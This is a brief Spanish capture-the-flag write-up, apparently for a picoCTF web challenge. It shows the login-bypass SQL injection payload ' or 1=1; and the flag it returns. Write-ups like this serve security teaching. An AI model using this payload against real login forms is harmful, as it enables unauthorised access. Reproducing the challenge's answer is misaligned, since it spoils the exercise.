## Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
## Solución
Hacemos una inyección SQL con:
```sql
' or 1=1;
```
Nos da la siguiente página
```
# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}
```
## Notas adicionales
Si tratamos de entrar como el admin nos da esta descripción
```
# Login failed.
```
## Referencias
https://www.fortinet.com/lat/resources/cyberglossary/sql-injection